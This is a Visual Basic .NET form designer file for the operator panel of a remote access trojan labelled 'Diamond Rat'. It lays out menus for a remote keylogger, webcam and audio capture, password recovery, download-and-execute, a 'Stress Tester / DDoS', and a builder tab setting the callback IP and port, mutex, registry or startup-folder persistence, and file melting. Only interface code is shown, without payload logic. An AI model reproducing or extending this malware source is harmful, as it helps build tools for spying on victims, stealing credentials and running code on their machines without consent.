        Me.RemoteKeyloggerToolStripMenuItem.Name = "RemoteKeyloggerToolStripMenuItem"
        Me.RemoteKeyloggerToolStripMenuItem.Size = New System.Drawing.Size(175, 22)
        Me.RemoteKeyloggerToolStripMenuItem.Text = "Remote Keylogger"
        '
        'AudioCaptureToolStripMenuItem
        '
        Me.AudioCaptureToolStripMenuItem.Image = CType(resources.GetObject("AudioCaptureToolStripMenuItem.Image"), System.Drawing.Image)
        Me.AudioCaptureToolStripMenuItem.Name = "AudioCaptureToolStripMenuItem"
        Me.AudioCaptureToolStripMenuItem.Size = New System.Drawing.Size(175, 22)
        Me.AudioCaptureToolStripMenuItem.Text = "Audio Capture"
        '
        'RemoteWebcamToolStripMenuItem
        '
        Me.RemoteWebcamToolStripMenuItem.Image = CType(resources.GetObject("RemoteWebcamToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RemoteWebcamToolStripMenuItem.Name = "RemoteWebcamToolStripMenuItem"
        Me.RemoteWebcamToolStripMenuItem.Size = New System.Drawing.Size(175, 22)
        Me.RemoteWebcamToolStripMenuItem.Text = "Remote Webcam"
        '
        'PasswordRecoveryToolStripMenuItem
        '
        Me.PasswordRecoveryToolStripMenuItem.Image = CType(resources.GetObject("PasswordRecoveryToolStripMenuItem.Image"), System.Drawing.Image)
        Me.PasswordRecoveryToolStripMenuItem.Name = "PasswordRecoveryToolStripMenuItem"
        Me.PasswordRecoveryToolStripMenuItem.Size = New System.Drawing.Size(175, 22)
        Me.PasswordRecoveryToolStripMenuItem.Text = "Password Recovery"
        '
        'ServerOptionsToolStripMenuItem
        '
        Me.ServerOptionsToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.UpdateServerToolStripMenuItem, Me.ExecuteFileToolStripMenuItem, Me.PingToolStripMenuItem, Me.UninstallToolStripMenuItem, Me.RestartToolStripMenuItem})
        Me.ServerOptionsToolStripMenuItem.Image = CType(resources.GetObject("ServerOptionsToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ServerOptionsToolStripMenuItem.Name = "ServerOptionsToolStripMenuItem"
        Me.ServerOptionsToolStripMenuItem.Size = New System.Drawing.Size(178, 22)
        Me.ServerOptionsToolStripMenuItem.Text = "Server Options"
        '
        'UpdateServerToolStripMenuItem
        '
        Me.UpdateServerToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.FromFileToolStripMenuItem, Me.FromURLToolStripMenuItem})
        Me.UpdateServerToolStripMenuItem.Image = CType(resources.GetObject("UpdateServerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.UpdateServerToolStripMenuItem.Name = "UpdateServerToolStripMenuItem"
        Me.UpdateServerToolStripMenuItem.Size = New System.Drawing.Size(147, 22)
        Me.UpdateServerToolStripMenuItem.Text = "Update Server"
        '
        'FromFileToolStripMenuItem
        '
        Me.FromFileToolStripMenuItem.Image = CType(resources.GetObject("FromFileToolStripMenuItem.Image"), System.Drawing.Image)
        Me.FromFileToolStripMenuItem.Name = "FromFileToolStripMenuItem"
        Me.FromFileToolStripMenuItem.Size = New System.Drawing.Size(126, 22)
        Me.FromFileToolStripMenuItem.Text = "From File"
        '
        'FromURLToolStripMenuItem
        '
        Me.FromURLToolStripMenuItem.Image = CType(resources.GetObject("FromURLToolStripMenuItem.Image"), System.Drawing.Image)
        Me.FromURLToolStripMenuItem.Name = "FromURLToolStripMenuItem"
        Me.FromURLToolStripMenuItem.Size = New System.Drawing.Size(126, 22)
        Me.FromURLToolStripMenuItem.Text = "From URL"
        '
        'ExecuteFileToolStripMenuItem
        '
        Me.ExecuteFileToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.FromFileToolStripMenuItem1, Me.FromURLToolStripMenuItem1})
        Me.ExecuteFileToolStripMenuItem.Image = CType(resources.GetObject("ExecuteFileToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ExecuteFileToolStripMenuItem.Name = "ExecuteFileToolStripMenuItem"
        Me.ExecuteFileToolStripMenuItem.Size = New System.Drawing.Size(147, 22)
        Me.ExecuteFileToolStripMenuItem.Text = "Execute File"
        '
        'FromFileToolStripMenuItem1
        '
        Me.FromFileToolStripMenuItem1.Image = CType(resources.GetObject("FromFileToolStripMenuItem1.Image"), System.Drawing.Image)
        Me.FromFileToolStripMenuItem1.Name = "FromFileToolStripMenuItem1"
        Me.FromFileToolStripMenuItem1.Size = New System.Drawing.Size(126, 22)
        Me.FromFileToolStripMenuItem1.Text = "From File"
        '
        'FromURLToolStripMenuItem1
        '
        Me.FromURLToolStripMenuItem1.Image = CType(resources.GetObject("FromURLToolStripMenuItem1.Image"), System.Drawing.Image)
        Me.FromURLToolStripMenuItem1.Name = "FromURLToolStripMenuItem1"
        Me.FromURLToolStripMenuItem1.Size = New System.Drawing.Size(126, 22)
        Me.FromURLToolStripMenuItem1.Text = "From URL"
        '
        'PingToolStripMenuItem
        '
        Me.PingToolStripMenuItem.Image = CType(resources.GetObject("PingToolStripMenuItem.Image"), System.Drawing.Image)
        Me.PingToolStripMenuItem.Name = "PingToolStripMenuItem"
        Me.PingToolStripMenuItem.Size = New System.Drawing.Size(147, 22)
        Me.PingToolStripMenuItem.Text = "Ping"
        '
        'UninstallToolStripMenuItem
        '
        Me.UninstallToolStripMenuItem.Image = CType(resources.GetObject("UninstallToolStripMenuItem.Image"), System.Drawing.Image)
        Me.UninstallToolStripMenuItem.Name = "UninstallToolStripMenuItem"
        Me.UninstallToolStripMenuItem.Size = New System.Drawing.Size(147, 22)
        Me.UninstallToolStripMenuItem.Text = "Uninstall"
        '
        'RestartToolStripMenuItem
        '
        Me.RestartToolStripMenuItem.Image = CType(resources.GetObject("RestartToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RestartToolStripMenuItem.Name = "RestartToolStripMenuItem"
        Me.RestartToolStripMenuItem.Size = New System.Drawing.Size(147, 22)
        Me.RestartToolStripMenuItem.Text = "Restart"
        '
        'MiscellaneousToolStripMenuItem
        '
        Me.MiscellaneousToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.MiscellaneousToolStripMenuItem1, Me.FunFunctionsToolStripMenuItem, Me.ScriptingToolStripMenuItem})
        Me.MiscellaneousToolStripMenuItem.Image = CType(resources.GetObject("MiscellaneousToolStripMenuItem.Image"), System.Drawing.Image)
        Me.MiscellaneousToolStripMenuItem.Name = "MiscellaneousToolStripMenuItem"
        Me.MiscellaneousToolStripMenuItem.Size = New System.Drawing.Size(178, 22)
        Me.MiscellaneousToolStripMenuItem.Text = "Miscellaneous"
        '
        'MiscellaneousToolStripMenuItem1
        '
        Me.MiscellaneousToolStripMenuItem1.Image = CType(resources.GetObject("MiscellaneousToolStripMenuItem1.Image"), System.Drawing.Image)
        Me.MiscellaneousToolStripMenuItem1.Name = "MiscellaneousToolStripMenuItem1"
        Me.MiscellaneousToolStripMenuItem1.Size = New System.Drawing.Size(149, 22)
        Me.MiscellaneousToolStripMenuItem1.Text = "Miscellaneous"
        '
        'FunFunctionsToolStripMenuItem
        '
        Me.FunFunctionsToolStripMenuItem.Image = CType(resources.GetObject("FunFunctionsToolStripMenuItem.Image"), System.Drawing.Image)
        Me.FunFunctionsToolStripMenuItem.Name = "FunFunctionsToolStripMenuItem"
        Me.FunFunctionsToolStripMenuItem.Size = New System.Drawing.Size(149, 22)
        Me.FunFunctionsToolStripMenuItem.Text = "Fun Functions"
        '
        'ScriptingToolStripMenuItem
        '
        Me.ScriptingToolStripMenuItem.Image = CType(resources.GetObject("ScriptingToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ScriptingToolStripMenuItem.Name = "ScriptingToolStripMenuItem"
        Me.ScriptingToolStripMenuItem.Size = New System.Drawing.Size(149, 22)
        Me.ScriptingToolStripMenuItem.Text = "Scripting"
        '
        'UserInputToolStripMenuItem
        '
        Me.UserInputToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RemoteChatToolStripMenuItem, Me.MessageBoxToolStripMenuItem})
        Me.UserInputToolStripMenuItem.Image = CType(resources.GetObject("UserInputToolStripMenuItem.Image"), System.Drawing.Image)
        Me.UserInputToolStripMenuItem.Name = "UserInputToolStripMenuItem"
        Me.UserInputToolStripMenuItem.Size = New System.Drawing.Size(178, 22)
        Me.UserInputToolStripMenuItem.Text = "User Input"
        '
        'RemoteChatToolStripMenuItem
        '
        Me.RemoteChatToolStripMenuItem.Enabled = False
        Me.RemoteChatToolStripMenuItem.Image = CType(resources.GetObject("RemoteChatToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RemoteChatToolStripMenuItem.Name = "RemoteChatToolStripMenuItem"
        Me.RemoteChatToolStripMenuItem.Size = New System.Drawing.Size(143, 22)
        Me.RemoteChatToolStripMenuItem.Text = "Remote Chat"
        '
        'MessageBoxToolStripMenuItem
        '
        Me.MessageBoxToolStripMenuItem.Image = CType(resources.GetObject("MessageBoxToolStripMenuItem.Image"), System.Drawing.Image)
        Me.MessageBoxToolStripMenuItem.Name = "MessageBoxToolStripMenuItem"
        Me.MessageBoxToolStripMenuItem.Size = New System.Drawing.Size(143, 22)
        Me.MessageBoxToolStripMenuItem.Text = "MessageBox"
        '
        'StressTesterToolStripMenuItem
        '
        Me.StressTesterToolStripMenuItem.Image = CType(resources.GetObject("StressTesterToolStripMenuItem.Image"), System.Drawing.Image)
        Me.StressTesterToolStripMenuItem.Name = "StressTesterToolStripMenuItem"
        Me.StressTesterToolStripMenuItem.Size = New System.Drawing.Size(178, 22)
        Me.StressTesterToolStripMenuItem.Text = "Stress Tester / DDoS"
        '
        'MapViewToolStripMenuItem
        '
        Me.MapViewToolStripMenuItem.Image = CType(resources.GetObject("MapViewToolStripMenuItem.Image"), System.Drawing.Image)
        Me.MapViewToolStripMenuItem.Name = "MapViewToolStripMenuItem"
        Me.MapViewToolStripMenuItem.Size = New System.Drawing.Size(178, 22)
        Me.MapViewToolStripMenuItem.Text = "Map View"
        '
        'Notify
        '
        Me.Notify.Icon = CType(resources.GetObject("Notify.Icon"), System.Drawing.Icon)
        Me.Notify.Text = "Diamond Rat"
        Me.Notify.Visible = True
        '
        'Rightclick_OnConnect
        '
        Me.Rightclick_OnConnect.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.OpenUrlToolStripMenuItem, Me.DownloadExecuteToolStripMenuItem, Me.ShoweMessageBoxToolStripMenuItem, Me.RemoveActionToolStripMenuItem, Me.DisableActionToolStripMenuItem, Me.EnableActionToolStripMenuItem})
        Me.Rightclick_OnConnect.Name = "Rightclick_OnConnect"
        Me.Rightclick_OnConnect.Size = New System.Drawing.Size(195, 136)
        '
        'OpenUrlToolStripMenuItem
        '
        Me.OpenUrlToolStripMenuItem.Image = CType(resources.GetObject("OpenUrlToolStripMenuItem.Image"), System.Drawing.Image)
        Me.OpenUrlToolStripMenuItem.Name = "OpenUrlToolStripMenuItem"
        Me.OpenUrlToolStripMenuItem.Size = New System.Drawing.Size(194, 22)
        Me.OpenUrlToolStripMenuItem.Text = "Open Url"
        '
        'DownloadExecuteToolStripMenuItem
        '
        Me.DownloadExecuteToolStripMenuItem.Image = CType(resources.GetObject("DownloadExecuteToolStripMenuItem.Image"), System.Drawing.Image)
        Me.DownloadExecuteToolStripMenuItem.Name = "DownloadExecuteToolStripMenuItem"
        Me.DownloadExecuteToolStripMenuItem.Size = New System.Drawing.Size(194, 22)
        Me.DownloadExecuteToolStripMenuItem.Text = "Download and Execute"
        '
        'ShoweMessageBoxToolStripMenuItem
        '
        Me.ShoweMessageBoxToolStripMenuItem.Image = CType(resources.GetObject("ShoweMessageBoxToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ShoweMessageBoxToolStripMenuItem.Name = "ShoweMessageBoxToolStripMenuItem"
        Me.ShoweMessageBoxToolStripMenuItem.Size = New System.Drawing.Size(194, 22)
        Me.ShoweMessageBoxToolStripMenuItem.Text = "Show MessageBox"
        '
        'RemoveActionToolStripMenuItem
        '
        Me.RemoveActionToolStripMenuItem.Image = CType(resources.GetObject("RemoveActionToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RemoveActionToolStripMenuItem.Name = "RemoveActionToolStripMenuItem"
        Me.RemoveActionToolStripMenuItem.Size = New System.Drawing.Size(194, 22)
        Me.RemoveActionToolStripMenuItem.Text = "Remove Action"
        '
        'DisableActionToolStripMenuItem
        '
        Me.DisableActionToolStripMenuItem.Image = CType(resources.GetObject("DisableActionToolStripMenuItem.Image"), System.Drawing.Image)
        Me.DisableActionToolStripMenuItem.Name = "DisableActionToolStripMenuItem"
        Me.DisableActionToolStripMenuItem.Size = New System.Drawing.Size(194, 22)
        Me.DisableActionToolStripMenuItem.Text = "Disable Action"
        '
        'EnableActionToolStripMenuItem
        '
        Me.EnableActionToolStripMenuItem.Image = CType(resources.GetObject("EnableActionToolStripMenuItem.Image"), System.Drawing.Image)
        Me.EnableActionToolStripMenuItem.Name = "EnableActionToolStripMenuItem"
        Me.EnableActionToolStripMenuItem.Size = New System.Drawing.Size(194, 22)
        Me.EnableActionToolStripMenuItem.Text = "Enable Action"
        '
        'CodePlexTabControl1
        '
        Me.CodePlexTabControl1.Anchor = CType((((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
            Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.CodePlexTabControl1.Controls.Add(Me.TabClient)
        Me.CodePlexTabControl1.Controls.Add(Me.TabBuilder)
        Me.CodePlexTabControl1.Controls.Add(Me.TabSettings)
        Me.CodePlexTabControl1.DrawMode = System.Windows.Forms.TabDrawMode.OwnerDrawFixed
        Me.CodePlexTabControl1.Font = New System.Drawing.Font("Segoe UI", 10.0!)
        Me.CodePlexTabControl1.ItemSize = New System.Drawing.Size(140, 41)
        Me.CodePlexTabControl1.Location = New System.Drawing.Point(2, 0)
        Me.CodePlexTabControl1.Name = "CodePlexTabControl1"
        Me.CodePlexTabControl1.SelectedIndex = 0
        Me.CodePlexTabControl1.Size = New System.Drawing.Size(879, 340)
        Me.CodePlexTabControl1.SizeMode = System.Windows.Forms.TabSizeMode.Fixed
        Me.CodePlexTabControl1.TabIndex = 0
        '
        'TabClient
        '
        Me.TabClient.Controls.Add(Me.ListView1)
        Me.TabClient.Location = New System.Drawing.Point(4, 45)
        Me.TabClient.Name = "TabClient"
        Me.TabClient.Padding = New System.Windows.Forms.Padding(3)
        Me.TabClient.Size = New System.Drawing.Size(871, 291)
        Me.TabClient.TabIndex = 0
        Me.TabClient.Text = "Clients"
        Me.TabClient.UseVisualStyleBackColor = True
        '
        'ListView1
        '
        Me.ListView1.Anchor = CType((((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
            Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.ListView1.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader1, Me.ColumnHeader2, Me.ColumnHeader3, Me.ColumnHeader4, Me.ColumnHeader5, Me.ColumnHeader6, Me.ColumnHeader7, Me.ColumnHeader8, Me.ColumnHeader9})
        Me.ListView1.ContextMenuStrip = Me.RightclickMain
        Me.ListView1.FullRowSelect = True
        Me.ListView1.Location = New System.Drawing.Point(3, 3)
        Me.ListView1.Name = "ListView1"
        Me.ListView1.Size = New System.Drawing.Size(865, 285)
        Me.ListView1.SmallImageList = Me.countryflags
        Me.ListView1.TabIndex = 0
        Me.ListView1.UseCompatibleStateImageBehavior = False
        Me.ListView1.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader1
        '
        Me.ColumnHeader1.Text = "Location"
        Me.ColumnHeader1.Width = 64
        '
        'ColumnHeader2
        '
        Me.ColumnHeader2.Text = "Public IP"
        Me.ColumnHeader2.Width = 109
        '
        'ColumnHeader3
        '
        Me.ColumnHeader3.Text = "Port"
        Me.ColumnHeader3.Width = 49
        '
        'ColumnHeader4
        '
        Me.ColumnHeader4.Text = "User Name"
        Me.ColumnHeader4.Width = 89
        '
        'ColumnHeader5
        '
        Me.ColumnHeader5.Text = "Computer Name"
        Me.ColumnHeader5.Width = 144
        '
        'ColumnHeader6
        '
        Me.ColumnHeader6.Text = "Operating System"
        Me.ColumnHeader6.Width = 158
        '
        'ColumnHeader7
        '
        Me.ColumnHeader7.Text = "Version"
        Me.ColumnHeader7.Width = 98
        '
        'ColumnHeader8
        '
        Me.ColumnHeader8.Text = "Privilegs"
        Me.ColumnHeader8.Width = 76
        '
        'ColumnHeader9
        '
        Me.ColumnHeader9.Text = "Ping"
        Me.ColumnHeader9.Width = 58
        '
        'TabBuilder
        '
        Me.TabBuilder.Controls.Add(Me.DotNetBarTabcontrol1)
        Me.TabBuilder.Location = New System.Drawing.Point(4, 45)
        Me.TabBuilder.Name = "TabBuilder"
        Me.TabBuilder.Padding = New System.Windows.Forms.Padding(3)
        Me.TabBuilder.Size = New System.Drawing.Size(871, 291)
        Me.TabBuilder.TabIndex = 1
        Me.TabBuilder.Text = "Builder"
        Me.TabBuilder.UseVisualStyleBackColor = True
        '
        'DotNetBarTabcontrol1
        '
        Me.DotNetBarTabcontrol1.Alignment = System.Windows.Forms.TabAlignment.Left
        Me.DotNetBarTabcontrol1.Controls.Add(Me.TabPage1)
        Me.DotNetBarTabcontrol1.Controls.Add(Me.TabPage2)
        Me.DotNetBarTabcontrol1.Controls.Add(Me.TabPage3)
        Me.DotNetBarTabcontrol1.ItemSize = New System.Drawing.Size(44, 136)
        Me.DotNetBarTabcontrol1.Location = New System.Drawing.Point(1, 1)
        Me.DotNetBarTabcontrol1.Multiline = True
        Me.DotNetBarTabcontrol1.Name = "DotNetBarTabcontrol1"
        Me.DotNetBarTabcontrol1.SelectedIndex = 0
        Me.DotNetBarTabcontrol1.Size = New System.Drawing.Size(870, 290)
        Me.DotNetBarTabcontrol1.SizeMode = System.Windows.Forms.TabSizeMode.Fixed
        Me.DotNetBarTabcontrol1.TabIndex = 1
        '
        'TabPage1
        '
        Me.TabPage1.BackColor = System.Drawing.Color.White
        Me.TabPage1.Controls.Add(Me.tb_ip)
        Me.TabPage1.Controls.Add(Me.RandomPool1)
        Me.TabPage1.Controls.Add(Me.tb_mutex)
        Me.TabPage1.Controls.Add(Me.Label6)
        Me.TabPage1.Controls.Add(Me.NumericUpDown2)
        Me.TabPage1.Controls.Add(Me.Label5)
        Me.TabPage1.Controls.Add(Me.Label4)
        Me.TabPage1.Location = New System.Drawing.Point(140, 4)
        Me.TabPage1.Name = "TabPage1"
        Me.TabPage1.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage1.Size = New System.Drawing.Size(726, 282)
        Me.TabPage1.TabIndex = 0
        Me.TabPage1.Text = "Network Information"
        '
        'tb_ip
        '
        Me.tb_ip.FormattingEnabled = True
        Me.tb_ip.Location = New System.Drawing.Point(72, 9)
        Me.tb_ip.Name = "tb_ip"
        Me.tb_ip.Size = New System.Drawing.Size(469, 25)
        Me.tb_ip.TabIndex = 15
        '
        'RandomPool1
        '
        Me.RandomPool1.BackColor = System.Drawing.Color.White
        Me.RandomPool1.Image = Nothing
        Me.RandomPool1.Location = New System.Drawing.Point(10, 71)
        Me.RandomPool1.Name = "RandomPool1"
        Me.RandomPool1.NoRounding = False
        Me.RandomPool1.Range = "0123456789!§$%&/()=?*+~#'-_<>|^°ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        Me.RandomPool1.RangePadding = 2
        Me.RandomPool1.Size = New System.Drawing.Size(705, 185)
        Me.RandomPool1.TabIndex = 14
        Me.RandomPool1.Text = "RandomPool1"
        '
        'tb_mutex
        '
        Me.tb_mutex.Location = New System.Drawing.Point(72, 40)
        Me.tb_mutex.Name = "tb_mutex"
        Me.tb_mutex.Size = New System.Drawing.Size(648, 25)
        Me.tb_mutex.TabIndex = 13
        '
        'Label6
        '
        Me.Label6.AutoSize = True
        Me.Label6.Location = New System.Drawing.Point(6, 43)
        Me.Label6.Name = "Label6"
        Me.Label6.Size = New System.Drawing.Size(55, 19)
        Me.Label6.TabIndex = 12
        Me.Label6.Text = "Mutex: "
        '
        'NumericUpDown2
        '
        Me.NumericUpDown2.Location = New System.Drawing.Point(595, 9)
        Me.NumericUpDown2.Maximum = New Decimal(New Integer() {65535, 0, 0, 0})
        Me.NumericUpDown2.Name = "NumericUpDown2"
        Me.NumericUpDown2.Size = New System.Drawing.Size(125, 25)
        Me.NumericUpDown2.TabIndex = 11
        '
        'Label5
        '
        Me.Label5.AutoSize = True
        Me.Label5.Location = New System.Drawing.Point(547, 11)
        Me.Label5.Name = "Label5"
        Me.Label5.Size = New System.Drawing.Size(41, 19)
        Me.Label5.TabIndex = 10
        Me.Label5.Text = "Port: "
        '
        'Label4
        '
        Me.Label4.AutoSize = True
        Me.Label4.Location = New System.Drawing.Point(6, 12)
        Me.Label4.Name = "Label4"
        Me.Label4.Size = New System.Drawing.Size(60, 19)
        Me.Label4.TabIndex = 8
        Me.Label4.Text = "IP/DNS: "
        '
        'TabPage2
        '
        Me.TabPage2.BackColor = System.Drawing.Color.White
        Me.TabPage2.Controls.Add(Me.Panel1)
        Me.TabPage2.Controls.Add(Me.Label9)
        Me.TabPage2.Controls.Add(Me.nud_delay)
        Me.TabPage2.Controls.Add(Me.cb_delay)
        Me.TabPage2.Controls.Add(Me.cb_melt)
        Me.TabPage2.Controls.Add(Me.cb_persistence)
        Me.TabPage2.Controls.Add(Me.rb_hkeylocal)
        Me.TabPage2.Controls.Add(Me.rb_hkeyuser)
        Me.TabPage2.Controls.Add(Me.rb_Startupfolder)
        Me.TabPage2.Controls.Add(Me.cb_enablestartup)
        Me.TabPage2.Controls.Add(Me.tb_execname)
        Me.TabPage2.Controls.Add(Me.Label8)
        Me.TabPage2.Controls.Add(Me.tb_subfoldername)
        Me.TabPage2.Controls.Add(Me.cb_dropinsubfolder)
        Me.TabPage2.Controls.Add(Me.Label7)
        Me.TabPage2.Controls.Add(Me.cb_installenable)
        Me.TabPage2.Location = New System.Drawing.Point(140, 4)
        Me.TabPage2.Name = "TabPage2"
        Me.TabPage2.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage2.Size = New System.Drawing.Size(726, 282)
        Me.TabPage2.TabIndex = 1
        Me.TabPage2.Text = "Additional Settings"
        '
        'Panel1
        '
        Me.Panel1.Controls.Add(Me.rb_programs)
        Me.Panel1.Controls.Add(Me.rb_programfiles)
        Me.Panel1.Controls.Add(Me.rb_temp)
        Me.Panel1.Controls.Add(Me.rb_appdataroaming)
        Me.Panel1.Controls.Add(Me.rb_appdata)
        Me.Panel1.Location = New System.Drawing.Point(65, 23)
        Me.Panel1.Name = "Panel1"
        Me.Panel1.Size = New System.Drawing.Size(655, 37)
        Me.Panel1.TabIndex = 20
        '
        'rb_programs
        '
        Me.rb_programs.AutoSize = True
        Me.rb_programs.Enabled = False
        Me.rb_programs.Location = New System.Drawing.Point(449, 10)
        Me.rb_programs.Name = "rb_programs"
        Me.rb_programs.Size = New System.Drawing.Size(86, 23)
        Me.rb_programs.TabIndex = 11
        Me.rb_programs.TabStop = True
        Me.rb_programs.Text = "Programs"
        Me.rb_programs.UseVisualStyleBackColor = True
        '
        'rb_programfiles
        '
        Me.rb_programfiles.AutoSize = True
        Me.rb_programfiles.Enabled = False
        Me.rb_programfiles.Location = New System.Drawing.Point(333, 10)
        Me.rb_programfiles.Name = "rb_programfiles"
        Me.rb_programfiles.Size = New System.Drawing.Size(110, 23)
        Me.rb_programfiles.TabIndex = 10
        Me.rb_programfiles.TabStop = True
        Me.rb_programfiles.Text = "Program Files"
        Me.rb_programfiles.UseVisualStyleBackColor = True
        '
        'rb_temp
        '
        Me.rb_temp.AutoSize = True
        Me.rb_temp.Enabled = False
        Me.rb_temp.Location = New System.Drawing.Point(266, 10)
        Me.rb_temp.Name = "rb_temp"
        Me.rb_temp.Size = New System.Drawing.Size(60, 23)
        Me.rb_temp.TabIndex = 9
        Me.rb_temp.TabStop = True
        Me.rb_temp.Text = "Temp"
        Me.rb_temp.UseVisualStyleBackColor = True
        '
        'rb_appdataroaming
        '
        Me.rb_appdataroaming.AutoSize = True
        Me.rb_appdataroaming.Enabled = False
        Me.rb_appdataroaming.Location = New System.Drawing.Point(123, 10)
        Me.rb_appdataroaming.Name = "rb_appdataroaming"
        Me.rb_appdataroaming.Size = New System.Drawing.Size(137, 23)
        Me.rb_appdataroaming.TabIndex = 8
        Me.rb_appdataroaming.TabStop = True
        Me.rb_appdataroaming.Text = "Appdata Roaming"
        Me.rb_appdataroaming.UseVisualStyleBackColor = True
        '
        'rb_appdata
        '
        Me.rb_appdata.AutoSize = True
        Me.rb_appdata.Enabled = False
        Me.rb_appdata.Location = New System.Drawing.Point(3, 10)
        Me.rb_appdata.Name = "rb_appdata"
        Me.rb_appdata.Size = New System.Drawing.Size(114, 23)
        Me.rb_appdata.TabIndex = 7
        Me.rb_appdata.TabStop = True
        Me.rb_appdata.Text = "Appdata Local"
        Me.rb_appdata.UseVisualStyleBackColor = True
        '
        'Label9
        '
        Me.Label9.AutoSize = True
        Me.Label9.Location = New System.Drawing.Point(252, 245)
        Me.Label9.Name = "Label9"
        Me.Label9.Size = New System.Drawing.Size(61, 19)
        Me.Label9.TabIndex = 19
        Me.Label9.Text = "seconds."
        '
        'nud_delay
        '
        Me.nud_delay.Location = New System.Drawing.Point(189, 242)
        Me.nud_delay.Name = "nud_delay"
        Me.nud_delay.Size = New System.Drawing.Size(57, 25)
        Me.nud_delay.TabIndex = 18
        '
        'cb_delay
        '
        Me.cb_delay.AutoSize = True
        Me.cb_delay.Location = New System.Drawing.Point(6, 243)
        Me.cb_delay.Name = "cb_delay"
        Me.cb_delay.Size = New System.Drawing.Size(183, 23)
        Me.cb_delay.TabIndex = 17
        Me.cb_delay.Text = "Execute it with a delay of "
        Me.cb_delay.UseVisualStyleBackColor = True
        '
        'cb_melt
        '
        Me.cb_melt.AutoSize = True
        Me.cb_melt.Location = New System.Drawing.Point(6, 212)
        Me.cb_melt.Name = "cb_melt"
        Me.cb_melt.Size = New System.Drawing.Size(121, 23)
        Me.cb_melt.TabIndex = 16
        Me.cb_melt.Text = "Hide / Melt File"
        Me.cb_melt.UseVisualStyleBackColor = True
        '
        'cb_persistence
        '
        Me.cb_persistence.AutoSize = True
        Me.cb_persistence.Enabled = False
        Me.cb_persistence.Image = CType(resources.GetObject("cb_persistence.Image"), System.Drawing.Image)
        Me.cb_persistence.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.cb_persistence.Location = New System.Drawing.Point(249, 181)
        Me.cb_persistence.Name = "cb_persistence"
        Me.cb_persistence.Size = New System.Drawing.Size(155, 23)
        Me.cb_persistence.TabIndex = 15
        Me.cb_persistence.Text = "    Enable Persistence"
        Me.cb_persistence.UseVisualStyleBackColor = True
        '
        'rb_hkeylocal
        '
        Me.rb_hkeylocal.AutoSize = True
        Me.rb_hkeylocal.Enabled = False
        Me.rb_hkeylocal.Image = CType(resources.GetObject("rb_hkeylocal.Image"), System.Drawing.Image)
        Me.rb_hkeylocal.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.rb_hkeylocal.Location = New System.Drawing.Point(34, 181)
        Me.rb_hkeylocal.Name = "rb_hkeylocal"
        Me.rb_hkeylocal.Size = New System.Drawing.Size(207, 23)
        Me.rb_hkeylocal.TabIndex = 14
        Me.rb_hkeylocal.TabStop = True
        Me.rb_hkeylocal.Text = "   At HKEY_LOCAL_MACHINE"
        Me.rb_hkeylocal.UseVisualStyleBackColor = True
        '
        'rb_hkeyuser
        '
        Me.rb_hkeyuser.AutoSize = True
        Me.rb_hkeyuser.Enabled = False
        Me.rb_hkeyuser.Location = New System.Drawing.Point(34, 152)
        Me.rb_hkeyuser.Name = "rb_hkeyuser"
        Me.rb_hkeyuser.Size = New System.Drawing.Size(165, 23)
        Me.rb_hkeyuser.TabIndex = 13
        Me.rb_hkeyuser.TabStop = True
        Me.rb_hkeyuser.Text = "At HKEY_LOCAL_USER"
        Me.rb_hkeyuser.UseVisualStyleBackColor = True
        '
        'rb_Startupfolder
        '
        Me.rb_Startupfolder.AutoSize = True
        Me.rb_Startupfolder.Enabled = False
        Me.rb_Startupfolder.Location = New System.Drawing.Point(34, 123)
        Me.rb_Startupfolder.Name = "rb_Startupfolder"
        Me.rb_Startupfolder.Size = New System.Drawing.Size(174, 23)
        Me.rb_Startupfolder.TabIndex = 12
        Me.rb_Startupfolder.TabStop = True
        Me.rb_Startupfolder.Text = "At the Startup Directory"
        Me.rb_Startupfolder.UseVisualStyleBackColor = True
        '
        'cb_enablestartup
        '
        Me.cb_enablestartup.AutoSize = True
        Me.cb_enablestartup.Location = New System.Drawing.Point(6, 94)
        Me.cb_enablestartup.Name = "cb_enablestartup"
        Me.cb_enablestartup.Size = New System.Drawing.Size(117, 23)
        Me.cb_enablestartup.TabIndex = 11
        Me.cb_enablestartup.Text = "Enable Startup"
        Me.cb_enablestartup.UseVisualStyleBackColor = True
        '
        'tb_execname
        '
        Me.tb_execname.Enabled = False
        Me.tb_execname.ForeColor = System.Drawing.SystemColors.ControlText
        Me.tb_execname.Location = New System.Drawing.Point(504, 62)
        Me.tb_execname.Name = "tb_execname"
        Me.tb_execname.Size = New System.Drawing.Size(216, 25)
        Me.tb_execname.TabIndex = 10
        Me.tb_execname.Text = "Executable Name.exe"
        '
        'Label8
        '
        Me.Label8.AutoSize = True
        Me.Label8.Location = New System.Drawing.Point(364, 65)
        Me.Label8.Name = "Label8"
        Me.Label8.Size = New System.Drawing.Size(134, 19)
        Me.Label8.TabIndex = 9
